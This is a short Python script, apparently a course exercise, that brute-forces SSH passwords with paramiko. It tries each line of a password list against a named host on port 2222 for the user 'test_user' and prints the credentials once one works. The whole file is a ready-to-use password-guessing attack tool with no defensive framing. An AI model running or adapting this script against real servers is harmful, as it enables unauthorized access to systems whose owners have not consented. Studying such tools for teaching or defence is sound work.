import paramiko as paramiko
import time

addr = "empty.jack.su"
login = "test_user"
port = 2222
file = "dz8_passlist.txt"

ssh = paramiko.SSHClient()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy)
def connect(host, user, pas, port):
    try:
        ssh.connect(hostname=host, username=user, password=pas, banner_timeout=60, port=port)
        print(f"\nSuccess! Used credentials {user} {pas}")
        return True
    except paramiko.AuthenticationException:
        print("*", end = "")
        return False


def brute(host, user, port, file):
    dict = open(file, 'r')
    for line in dict:
        flag = connect(host, user, line.strip(), port)
        if flag:
            break


if __name__ == "__main__":
    brute(addr, login, port, file)
